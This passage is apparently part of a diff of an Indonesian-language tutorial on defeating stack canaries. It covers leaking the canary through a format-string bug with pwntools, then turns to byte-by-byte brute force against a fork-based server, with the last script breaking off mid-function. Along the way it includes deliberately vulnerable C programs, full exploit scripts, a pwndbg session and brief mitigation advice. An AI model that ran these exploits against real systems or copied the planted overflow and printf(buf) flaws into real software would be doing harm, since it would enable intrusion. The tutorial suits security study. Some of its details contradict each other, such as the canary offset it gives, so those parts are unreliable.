-</span></span><span style="display:flex;"><span>    <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#34;B&#34;</span> * <span style="color:#f60">12</span> +      <span style="color:#0f0"># Padding (EBP &amp; alignment)</span>
-</span></span><span style="display:flex;"><span>    rop.chain()      <span style="color:#0f0"># ROP chain</span>
-</span></span><span style="display:flex;"><span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>p.sendline(payload)
-</span></span><span style="display:flex;"><span>p.interactive()  <span style="color:#0f0"># Dapat shell!</span>
-</span></span></code></pre></div><hr>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Fuzz offset</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">20</span>):
+</span></span><span style="display:flex;"><span>    p.sendline(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$p&#39;</span>.encode())
+</span></span><span style="display:flex;"><span>    response = p.recvline()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Offset </span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">: </span><span style="color:#87ceeb">{</span>response<span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>    p.clean()
+</span></span></code></pre></div><h3 id="langkah-3-identifikasi-canary">Langkah 3: Identifikasi Canary</h3>
+<p>Canary biasanya memiliki karakteristik:</p>
 <ul>
-<li><strong>1 Byte = 8 Bit = Nilai 0-255 (256 kemungkinan).</strong></li>
-<li><strong>Brute-force canary</strong> = Mencoba semua kemungkinan byte (<code>0-255</code>) untuk menemukan nilai canary.</li>
-<li><strong>32-bit canary</strong> = 4 byte (3 byte ditebak, 1 byte null).</li>
-<li><strong>64-bit canary</strong> = 8 byte (7 byte ditebak, 1 byte null).</li>
-<li><strong>Setelah dapat canary</strong>, lanjutkan dengan <strong>ROP/Ret2Libc</strong> untuk bypass NX.</li>
+<li>Nilai berubah setiap run (karena random)</li>
+<li>Byte terakhir biasanya <code>\x00</code> (null byte untuk mencegah string overflow)</li>
+<li>Format hexadecimal yang valid</li>
 </ul>
-<h1 id="beberapa-fungsi-yang-vulnerability">Beberapa fungsi yang vulnerability</h1>
-<p>Canary biasanya terlibat ketika ada fungsi <strong>tidak aman</strong> yang membaca input user, seperti:</p>
+<p><strong>Contoh output fuzzing:</strong></p>
+<pre tabindex="0"><code>Offset 1: 0x41414141  // AAAA kita
+Offset 2: 0xf7fa5000  // Libc address
+Offset 3: 0x8048520   // Code address
+Offset 4: (nil)       // Null pointer
+Offset 5: 0xff8f7a44  // Stack address
+Offset 6: 0xefbe37a0  // Kemungkinan canary (random, berakhir 00)
+Offset 7: 0x1         // 
+Offset 8: 0xff8f7b14  // 
+</code></pre><h3 id="langkah-4-konfirmasi-canary">Langkah 4: Konfirmasi Canary</h3>
+<p>Verifikasi dengan mengirim payload yang specifically target suspected canary offset:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;%6$p&#39;</span>)  <span style="color:#0f0"># Coba offset 6</span>
+</span></span><span style="display:flex;"><span>response = p.recvline()
+</span></span><span style="display:flex;"><span>canary_candidate = int(response.strip(), <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Cek karakteristik canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">if</span> canary_candidate &amp; <span style="color:#f60">0xff</span> == <span style="color:#f60">0x00</span>:  <span style="color:#0f0"># Byte terakhir null</span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Potential canary found: 0x</span><span style="color:#87ceeb">{</span>canary_candidate<span style="color:#87ceeb">:</span><span style="color:#87ceeb">08x</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span></code></pre></div><h2 id="4-implementasi-exploit-lengkap">4. Implementasi Exploit Lengkap</h2>
+<h3 id="contoh-program-vulnerable">Contoh Program Vulnerable:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">vuln</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buf[<span style="color:#f60">64</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Enter your name: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">read</span>(<span style="color:#f60">0</span>, buf, <span style="color:#f60">100</span>);  <span style="color:#0f0">// Buffer overflow here
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Hello, &#34;</span>); 
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(buf);  <span style="color:#0f0">// Format string vulnerability here
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;</span><span style="color:#87ceeb">\n</span><span style="color:#87ceeb">&#34;</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">printf</span>(<span style="color:#87ceeb">&#34;Enter your message: &#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">read</span>(<span style="color:#f60">0</span>, buf, <span style="color:#f60">200</span>);  <span style="color:#0f0">// Second buffer overflow
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">vuln</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="eksploitasi-step-by-step">Eksploitasi Step-by-Step:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Context setting</span>
+</span></span><span style="display:flex;"><span>context(arch=<span style="color:#87ceeb">&#39;i386&#39;</span>, os=<span style="color:#87ceeb">&#39;linux&#39;</span>)
+</span></span><span style="display:flex;"><span>context.log_level = <span style="color:#87ceeb">&#39;debug&#39;</span>  <span style="color:#0f0"># Untuk output verbose</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Start process</span>
+</span></span><span style="display:flex;"><span>p = process(<span style="color:#87ceeb">&#39;./vulnerable_program&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 1] Bypass prompt pertama</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#34;Enter your name: &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 2] Kirim format string untuk leak canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Setelah fuzzing, kita tahu canary ada di offset 7</span>
+</span></span><span style="display:flex;"><span>p.sendline(<span style="color:#87ceeb">&#39;%7$p&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 3] Parse leaked canary</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#34;Hello, &#34;</span>)
+</span></span><span style="display:flex;"><span>leak = p.recvline().strip()
+</span></span><span style="display:flex;"><span>canary = int(leak, <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>log.success(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Leaked canary: 0x</span><span style="color:#87ceeb">{</span>canary<span style="color:#87ceeb">:</span><span style="color:#87ceeb">08x</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 4] Konfirmasi karakteristik canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">if</span> canary &amp; <span style="color:#f60">0xff</span> != <span style="color:#f60">0x00</span>:
+</span></span><span style="display:flex;"><span>    log.warning(<span style="color:#87ceeb">&#34;This might not be a canary (no null byte)&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Mungkin perlu coba offset lain</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 5] Bypass prompt kedua</span>
+</span></span><span style="display:flex;"><span>p.recvuntil(<span style="color:#87ceeb">&#34;Enter your message: &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 6] Bangun payload dengan canary yang valid</span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Hitung offset berdasarkan analisis binary</span>
+</span></span><span style="display:flex;"><span>offset = <span style="color:#f60">64</span>  <span style="color:#0f0"># Size buffer</span>
+</span></span><span style="display:flex;"><span>padding = <span style="color:#f60">8</span>  <span style="color:#0f0"># EBP yang disimpan</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;A&#39;</span> * offset      <span style="color:#0f0"># Isi buffer</span>
+</span></span><span style="display:flex;"><span>payload += p32(canary)       Canary yang valid
+</span></span><span style="display:flex;"><span>payload += <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;B&#39;</span> * padding    <span style="color:#0f0"># Overwrite EBP</span>
+</span></span><span style="display:flex;"><span>payload += p32(<span style="color:#f60">0xdeadbeef</span>)   <span style="color:#0f0"># Return address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 7] Kirim payload</span>
+</span></span><span style="display:flex;"><span>p.sendline(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># [STEP 8] Interact dengan shell</span>
+</span></span><span style="display:flex;"><span>p.interactive()
+</span></span></code></pre></div><h2 id="5-analisis-assembly-dan-debugging">5. Analisis Assembly dan Debugging</h2>
+<h3 id="disassembly-fungsi-vulnerable">Disassembly Fungsi Vulnerable:</h3>
+<pre tabindex="0"><code class="language-assembly" data-lang="assembly">080484db &lt;vuln&gt;:
+ 80484db:       55                      push   ebp
+ 80484dc:       89 e5                   mov    ebp,esp
+ 80484de:       83 ec 48                sub    esp,0x48
+ 80484e1:       65 a1 14 00 00 00       mov    eax,gs:0x14
+ 80484e7:       89 45 f4                mov    DWORD PTR [ebp-0xc],eax  ; Simpan canary
+ 80484ea:       31 c0                   xor    eax,eax
+ 80484ec:       83 ec 0c                sub    esp,0xc
+ 80484ef:       68 90 85 04 08          push   0x8048590                ; &#34;Enter your name: &#34;
+ 80484f4:       e8 87 fe ff ff          call   8048380 &lt;printf@plt&gt;
+ 80484f9:       83 c4 10                add    esp,0x10
+ 80484fc:       83 ec 04                sub    esp,0x4
+ 80484ff:       6a 64                   push   0x64                     ; 100 bytes
+ 8048501:       8d 45 b4                lea    eax,[ebp-0x4c]           ; Buffer di ebp-0x4c
+ 8048504:       50                      push   eax
+ 8048505:       6a 00                   push   0x0
+ 8048507:       e8 a4 fe ff ff          call   80483b0 &lt;read@plt&gt;
+ 804850c:       83 c4 10                add    esp,0x10
+ 804850f:       83 ec 0c                sub    esp,0xc
+ 8048512:       68 a2 85 04 08          push   0x80485a2                ; &#34;Hello, &#34;
+ 8048517:       e8 64 fe ff ff          call   8048380 &lt;printf@plt&gt;
+ 804851c:       83 c4 10                add    esp,0x10
+ 804851f:       83 ec 0c                sub    esp,0xc
+ 8048522:       8d 45 b4                lea    eax,[ebp-0x4c]           ; Buffer vulnerable!
+ 8048525:       50                      push   eax
+ 8048526:       e8 55 fe ff ff          call   8048380 &lt;printf@plt&gt;     ; Format string vuln
+ 804852b:       83 c4 10                add    esp,0x10
+ 804852e:       83 ec 0c                sub    esp,0xc
+ 8048531:       6a 0a                   push   0xa                      ; &#34;\n&#34;
+ 8048533:       e8 68 fe ff ff          call   80483a0 &lt;putchar@plt&gt;
+ 8048538:       83 c4 10                add    esp,0x10
+ 804853b:       83 ec 0c                sub    esp,0xc
+ 804853e:       68 a9 85 04 08          push   0x80485a9                ; &#34;Enter your message: &#34;
+ 8048543:       e8 38 fe ff ff          call   8048380 &lt;printf@plt&gt;
+ 8048548:       83 c4 10                add    esp,0x10
+ 804854b:       83 ec 04                sub    esp,0x4
+ 804854e:       68 c8 00 00 00          push   0xc8                     ; 200 bytes
+ 8048553:       8d 45 b4                lea    eax,[ebp-0x4c]           ; Buffer overflow
+ 8048556:       50                      push   eax
+ 8048557:       6a 00                   push   0x0
+ 8048559:       e8 52 fe ff ff          call   80483b0 &lt;read@plt&gt;
+ 804855e:       83 c4 10                add    esp,0x10
+ 8048561:       8b 45 f4                mov    eax,DWORD PTR [ebp-0xc]  ; Load canary
+ 8048564:       65 33 05 14 00 00 00    xor    eax,gs:0x14
+ 804856b:       74 05                   je     8048572 &lt;vuln+0x97&gt;
+ 804856d:       e8 3e fe ff ff          call   80483b0 &lt;__stack_chk_fail@plt&gt;
+ 8048572:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
+ 8048575:       c9                      leave  
+ 8048576:       8d 61 fc                lea    esp,[ecx-0x4]
+ 8048579:       c3                      ret
+</code></pre><h3 id="analisis-debugging-dengan-pwndbg">Analisis Debugging dengan PWNDBG:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#0f0"># Start debugging</span>
+</span></span><span style="display:flex;"><span>gdb ./vulnerable_program
+</span></span><span style="display:flex;"><span>pwndbg&gt; break *0x8048526  <span style="color:#0f0"># Break sebelum printf vulnerable</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; r
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Saat breakpoint hit, periksa stack</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; telescope <span style="color:#f60">20</span>
+</span></span><span style="display:flex;"><span>00:0000│ esp 0xffffd500 —▸ 0xffffd52c ◂— <span style="color:#87ceeb">&#39;AAAA.%7$p&#39;</span>
+</span></span><span style="display:flex;"><span>01:0004│     0xffffd504 ◂— 0x0
+</span></span><span style="display:flex;"><span>02:0008│     0xffffd508 ◂— 0xf7fa5000
+</span></span><span style="display:flex;"><span>03:000c│     0xffffd50c ◂— 0x8048520
+</span></span><span style="display:flex;"><span>04:0010│     0xffffd510 ◂— 0x0
+</span></span><span style="display:flex;"><span>05:0014│     0xffffd514 ◂— 0xff8f7a44
+</span></span><span style="display:flex;"><span>06:0018│     0xffffd518 ◂— 0xefbe37a0  <span style="color:#0f0"># Canary candidate</span>
+</span></span><span style="display:flex;"><span>07:001c│     0xffffd51c ◂— 0x1
+</span></span><span style="display:flex;"><span>08:0020│     0xffffd520 ◂— 0xff8f7b14
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Verifikasi canary</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; x/xw <span style="color:#eedd82">$ebp</span>-0xc
+</span></span><span style="display:flex;"><span>0xffffd51c:     0xefbe37a0  <span style="color:#0f0"># Match dengan offset 7</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Lanjut execution</span>
+</span></span><span style="display:flex;"><span>pwndbg&gt; ni
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Program akan mencetak &#34;Hello, 0xefbe37a0&#34;</span>
+</span></span></code></pre></div><h2 id="6-advanced-techniques-dan-edge-cases">6. Advanced Techniques dan Edge Cases</h2>
+<h3 id="multiple-format-string-exploits">Multiple Format String Exploits:</h3>
+<p>Jika ada multiple format string vulnerabilities, kita bisa gunakan yang pertama untuk leak canary dan yang kedua untuk write exploit.</p>
+<h3 id="partial-overwrite-dengan-n">Partial Overwrite dengan %n:</h3>
+<p>Kita bisa gunakan <code>%n</code> untuk menulis nilai ke memory, tapi perlu hati-hati karena bisa merusak canary.</p>
+<h3 id="bypass-aslr-dengan-format-string">Bypass ASLR dengan Format String:</h3>
+<p>Selain leak canary, format string bisa digunakan untuk leak alamat libc, heap, atau stack untuk bypass ASLR.</p>
+<h3 id="automating-dengan-pwntools">Automating dengan Pwntools:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#0f0"># Automated canary finding</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">find_canary_offset</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> i in range(<span style="color:#f60">1</span>, <span style="color:#f60">30</span>):
+</span></span><span style="display:flex;"><span>        p = process(<span style="color:#87ceeb">&#39;./vulnerable&#39;</span>)
+</span></span><span style="display:flex;"><span>        p.recvuntil(<span style="color:#87ceeb">&#34;name: &#34;</span>)
+</span></span><span style="display:flex;"><span>        p.sendline(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#39;%</span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">$p&#39;</span>.encode())
+</span></span><span style="display:flex;"><span>        p.recvuntil(<span style="color:#87ceeb">&#34;Hello, &#34;</span>)
+</span></span><span style="display:flex;"><span>        leak = p.recvline().strip()
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">try</span>:
+</span></span><span style="display:flex;"><span>            value = int(leak, <span style="color:#f60">16</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span> value &amp; <span style="color:#f60">0xff</span> == <span style="color:#f60">0x00</span>:  <span style="color:#0f0"># Null byte characteristic</span>
+</span></span><span style="display:flex;"><span>                log.info(<span style="color:#87ceeb">f</span><span style="color:#87ceeb">&#34;Potential canary at offset </span><span style="color:#87ceeb">{</span>i<span style="color:#87ceeb">}</span><span style="color:#87ceeb">: 0x</span><span style="color:#87ceeb">{</span>value<span style="color:#87ceeb">:</span><span style="color:#87ceeb">08x</span><span style="color:#87ceeb">}</span><span style="color:#87ceeb">&#34;</span>)
+</span></span><span style="display:flex;"><span>                <span style="color:#0f0"># Verify by checking if it changes between runs</span>
+</span></span><span style="display:flex;"><span>                p.close()
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span> i
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">except</span>:
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">pass</span>
+</span></span><span style="display:flex;"><span>        p.close()
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f00">None</span>
+</span></span></code></pre></div><h2 id="7-mitigation-dan-countermeasures">7. Mitigation dan Countermeasures</h2>
+<h3 id="cara-mencegah-format-string-vulnerability">Cara Mencegah Format String Vulnerability:</h3>
+<ol>
+<li>Selalu gunakan format string literal: <code>printf(&quot;%s&quot;, user_input)</code></li>
+<li>Gunakan functions yang lebih aman seperti <code>snprintf</code></li>
+<li>Implementasi stack canaries dengan nilai yang sangat random</li>
+<li>Gunakan compile-time protections seperti <code>-D_FORTIFY_SOURCE=2</code></li>
+</ol>
+<h3 id="deteksi-dengan-static-analysis">Deteksi dengan Static Analysis:</h3>
+<p>Tools seperti Coverity, Checkmarx, atau Semgrep bisa detect pattern vulnerable seperti <code>printf(user_input)</code>.</p>
+<h1 id="b-brute-force-untuk-fork-based-server">B. Brute Force (Untuk Fork-based Server)</h1>
+<p>Fork-based server adalah server yang menggunakan system call <code>fork()</code> untuk menangani setiap koneksi client secara terpisah. Setiap koneksi baru dibuat dalam proses child yang merupakan duplikat dari proses parent.</p>
+<h3 id="copy-on-write-cow-mechanism">Copy-on-Write (CoW) Mechanism:</h3>
+<ul>
+<li>Pada sistem modern, <code>fork()</code> menggunakan teknik Copy-on-Write</li>
+<li>Memory pages dibagi antara parent dan child sampai salah satu proses mencoba menulis</li>
+<li>Canary yang di-generate oleh parent akan diwarisi oleh semua child processes</li>
+<li>Karena canary tidak diubah setelah fork, nilainya tetap sama across connections</li>
+</ul>
+<h3 id="mengapa-brute-force-mungkin">Mengapa Brute Force Mungkin?</h3>
+<ul>
+<li><strong>Deterministic</strong>: Canary sama untuk setiap koneksi baru</li>
+<li><strong>Byte-by-byte</strong>: Kita bisa menebak canary satu byte per satu byte</li>
+<li><strong>Feedback</strong>: Server akan crash jika canary salah, tetap hidup jika benar</li>
+<li><strong>256 possibilities per byte</strong>: Hanya 256 kemungkinan per byte (feasible)</li>
+</ul>
+<h2 id="2-arsitektur-fork-based-server-vulnerable">2. Arsitektur Fork-based Server Vulnerable</h2>
+<h3 id="contoh-server-code">Contoh Server Code:</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdio.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;stdlib.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;unistd.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;sys/socket.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5">#include</span> <span style="color:#e5e5e5">&lt;netinet/in.h&gt;</span><span style="color:#e5e5e5">
+</span></span></span><span style="display:flex;"><span><span style="color:#e5e5e5"></span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">void</span> <span style="color:#ff0">handle_client</span>(<span style="color:#ee82ee">int</span> sock) {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">char</span> buffer[<span style="color:#f60">64</span>];
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// Baca input dari client
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">read</span>(sock, buffer, <span style="color:#f60">128</span>);  <span style="color:#0f0">// Buffer overflow vulnerability
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// Process client request
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#ff0">write</span>(sock, <span style="color:#87ceeb">&#34;Response&#34;</span>, <span style="color:#f60">8</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ee82ee">int</span> <span style="color:#ff0">main</span>() {
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">int</span> server_fd, client_sock;
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">struct</span> sockaddr_in address;
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">int</span> opt = <span style="color:#f60">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#ee82ee">int</span> addrlen = <span style="color:#f00">sizeof</span>(address);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0">// Create socket
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    server_fd = <span style="color:#ff0">socket</span>(AF_INET, SOCK_STREAM, <span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">setsockopt</span>(server_fd, SOL_SOCKET, SO_REUSEADDR, &amp;opt, <span style="color:#f00">sizeof</span>(opt));
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    address.sin_family = AF_INET;
+</span></span><span style="display:flex;"><span>    address.sin_addr.s_addr = INADDR_ANY;
+</span></span><span style="display:flex;"><span>    address.sin_port = <span style="color:#ff0">htons</span>(<span style="color:#f60">1234</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">bind</span>(server_fd, (<span style="color:#f00">struct</span> sockaddr*)&amp;address, <span style="color:#f00">sizeof</span>(address));
+</span></span><span style="display:flex;"><span>    <span style="color:#ff0">listen</span>(server_fd, <span style="color:#f60">3</span>);
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">while</span>(<span style="color:#f60">1</span>) {
+</span></span><span style="display:flex;"><span>        client_sock = <span style="color:#ff0">accept</span>(server_fd, (<span style="color:#f00">struct</span> sockaddr*)&amp;address, (<span style="color:#ee82ee">socklen_t</span>*)&amp;addrlen);
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#0f0">// Fork untuk handle client baru
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>        <span style="color:#f00">if</span> (<span style="color:#ff0">fork</span>() == <span style="color:#f60">0</span>) {
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">close</span>(server_fd);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">handle_client</span>(client_sock);
+</span></span><span style="display:flex;"><span>            <span style="color:#ff0">exit</span>(<span style="color:#f60">0</span>);
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        <span style="color:#ff0">close</span>(client_sock);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="3-metodologi-brute-force-lengkap">3. Metodologi Brute Force Lengkap</h2>
+<h3 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">from</span> pwn <span style="color:#f00">import</span> *
+</span></span><span style="display:flex;"><span><span style="color:#f00">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0"># Tentukan offset ke canary</span>
+</span></span><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">find_canary_offset</span>():
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Gunakan pattern create/analyze atau manual calculation</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Berdasarkan analisis binary</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">return</span> <span style="color:#f60">64</span>  <span style="color:#0f0"># Contoh: canary berada setelah 64 bytes buffer</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>offset = find_canary_offset()
+</span></span></code></pre></div><h3 id="phase-2-byte-by-byte-bruteforce">Phase 2: Byte-by-byte Bruteforce</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f00">def</span> <span style="color:#ff0">brute_force_canary</span>(host, port, offset):
+</span></span><span style="display:flex;"><span>    canary = <span style="color:#87ceeb">b</span><span style="color:#87ceeb">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span>    found_byte = <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#0f0"># Bruteforce 4 bytes (32-bit canary)</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">for</span> byte_num in range(<span style="color:#f60">4</span>):
+</span></span><span style="display:flex;"><span>        found_byte = <span style="color:#f00">False</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">for</span> byte_val in range(<span style="color:#f60">256</span>):
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Buat koneksi baru</span>
+</span></span><span style="display:flex;"><span>            conn = remote(host, port)
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>            <span style="color:#0f0"># Bangun payload</span>
